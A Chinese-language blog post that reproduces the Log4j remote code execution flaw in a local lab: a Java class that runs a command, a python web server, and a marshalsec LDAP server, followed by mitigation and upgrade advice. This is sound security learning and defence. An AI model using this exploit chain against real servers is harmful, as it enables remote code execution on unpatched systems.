---
title: Apache_Log4j_RCE
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2021-12-10 13:31:59
top:
tags:
layout:
---
编写进度
- [x] 


# Apache-Log4j
[Apache Log4j 远程代码执行](https://github.com/askDing/apache-log4j-poc)

> 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响

![image](https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png)

## 复线步骤
### 编译exp-修改Log4jRCE.java
``` java
public class Log4jRCE {
    static{
        try{
            String[] cmd={"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```
### python起个本地简易web服务
在target/classes目录下执行 `python3 -m http.server 8888`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134009.png)
### 在本地起一个ldap服务
`java  -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210141034.png)

### 运行log4j.java程序
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134659.png)

![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/log4j-payload.png)

## 临时修复方案：

（1）修改jvm参数
-Dlog4j2.formatMsgNoLookups=true

（2）修改配置
在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true


①在jvm启动参数中添加

`-Dlog4j2.formatMsgNoLookups=true`

![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210151940.png)




③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置`log4j2.formatMsgNoLookups=true`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152139.png)

Log4j2 漏洞修复建议
临时性缓解措施（任选一种，但是注意，只有 >=2.1.0 版本才可以用，老版本不支持这个选项）
在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true
系统环境变量中将LOG4J_FORMAT_MSG_NO_LOOKUPS 设置为 true
创建 log4j2.component.properties 文件，文件中增加配置 log4j2.formatMsgNoLookups=true
彻底修复漏洞:
方案一、研发代码修复：升级到官方提供的 log4j-2.15.0-rc2 版本
方案二、生产环境修复：https://github.com/zhangyoufu/log4j2-without-jndi。（如果不放心网上下载的版本，也可以自己手动解压删除：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 删除jar包里的这个漏洞相关的class，然后重启服务即可）

[长亭检测工具](https://log4j2-detector.chaitin.cn/)
